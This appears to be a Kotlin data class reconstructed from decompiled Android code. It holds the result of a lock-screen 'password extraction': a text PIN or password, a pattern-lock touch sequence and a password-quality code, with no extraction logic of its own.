package com.storm.safe.rock.service.modules.cipher

import java.io.Serializable
import java.util.ArrayList

/**
 * 密码提取结果。
 *
 * JADX: CipherResult.java (31 行)
 * 字段映射:
 *   f53233a0 → textCipher     (文本密码)
 *   f53234a1 → touchCipher    (触摸坐标序列)
 *   f53235a2 → cipherGradeCode (密码等级代码)
 */
class CipherResult : Serializable {

    /** 文本密码 (PIN/密码) */
    var textCipher: String? = null

    /** 触摸坐标序列 (图案密码) */
    var touchCipher: ArrayList<Point>? = null

    /** 密码等级代码: PASSWORD_QUALITY_NUMERIC_COMPLEX / PASSWORD_QUALITY_ALPHANUMERIC / PASSWORD_QUALITY_PATTERN / PASSWORD_QUALITY_TOUCH_POINTS */
    var cipherGradeCode: String? = null

    override fun toString(): String {
        return "CipherResult{textCipher='$textCipher', touchCipher=$touchCipher, cipherGradeCode='$cipherGradeCode'}"
    }
}
